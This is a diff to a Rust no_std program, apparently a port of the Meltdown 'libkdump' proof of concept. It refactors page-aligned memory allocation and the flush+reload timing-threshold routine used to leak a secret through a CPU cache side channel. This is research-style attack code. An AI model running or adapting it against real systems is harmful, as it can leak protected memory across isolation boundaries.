@@ -6,15 +6,15 @@ extern crate alloc;
 use runtime::*;
 use terminal::{print, println};
 use alloc::vec::Vec;
-use core::ptr;
+use core::{ptr, mem};
 use alloc::alloc::{alloc, dealloc, handle_alloc_error, Layout};
 
 
 use core::arch::asm;
 
-const PAGE_SIZE: usize = 1;
+const PAGE_SIZE: usize = 256;
 
-#[derive(Copy, Clone)] // Required to initialize an entire array with such objects
+#[derive(Copy, Clone, Debug)] // Required to initialize an entire array with such objects
 #[allow(dead_code)]
 pub struct MemoryPage([u128; PAGE_SIZE]);
 
@@ -122,17 +122,14 @@ pub fn libkdump_read(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPa
 	}
 }
 
-pub fn detect_flush_reload_threshold() -> u64{
+pub fn detect_flush_reload_threshold(pointer: *const MemoryPage) -> u64{
     let mut reload_time: u64 = 0;
     let mut flush_reload_time: u64 = 0;
     let count: u64 = 10000000;
-    let dummy = MemoryPage([0; PAGE_SIZE]); // TODO Use single value instead of array ok?
-    let pointer: *const MemoryPage;
     let mut start_time: u64;
     let mut end_time: u64;
     
-    pointer = &dummy;
-    
+    // TODO Use single value instead of array ok?    
     maccess(pointer);
     for _ in 0..count {
         start_time = rdtsc();
@@ -168,26 +165,35 @@ pub fn main() {
 		accept_after: 1,
 		retries: 1000,
 	};
-    
-    println!("Current CPU time: {}", rdtsc());
-    let cache_miss_threshold = detect_flush_reload_threshold();
-    
-	let mut mem: *const MemoryPage;
+	    
+	let mut mem: Vec<MemoryPage>;
+	let total_memory = mem::size_of::<MemoryPage>() * ARRAY_SIZE;
 	
 	unsafe {
-		let layout = Layout::from_size_align(4096,4096).expect("Layout creation failed");
+		let layout = Layout::from_size_align(total_memory, 4096).expect("Layout creation failed");
 		let ptr = alloc(layout);
 		if ptr.is_null() {
 			handle_alloc_error(layout);
 		}
-		ptr::write_bytes(ptr, 16, 4096);
-		mem = (*ptr as *mut MemoryPage);
+		ptr::write_bytes(ptr, 0, total_memory);
+		mem = Vec::from_raw_parts(ptr as *mut MemoryPage, ARRAY_SIZE, ARRAY_SIZE);
 	}
     
+    let mut sum;
+    let mut ptr;
     for i in 0..ARRAY_SIZE {
-		println!("{:p}", mem.offset(i as isize));
-        flush(mem.offset(i as isize));
-    }
+		ptr = &mem[i] as *const MemoryPage;
+		sum = mem[i].0.iter().sum::<u128>();
+		println!("{}, {:p}: {}", i, ptr, sum);
+		
+		assert_eq!((ptr as usize) % 4096, 0); // Check whether all elements are 4K aligned
+		assert_eq!(0, sum); // Check whether all elements are initialised with 0
+		
+		flush(ptr);
+	}
+	
+	println!("Current CPU time: {}", rdtsc());
+	let cache_miss_threshold = detect_flush_reload_threshold(&mem[0] as *const MemoryPage);
     
     let mut index: usize = 0;
     while index < SECRET.len() {
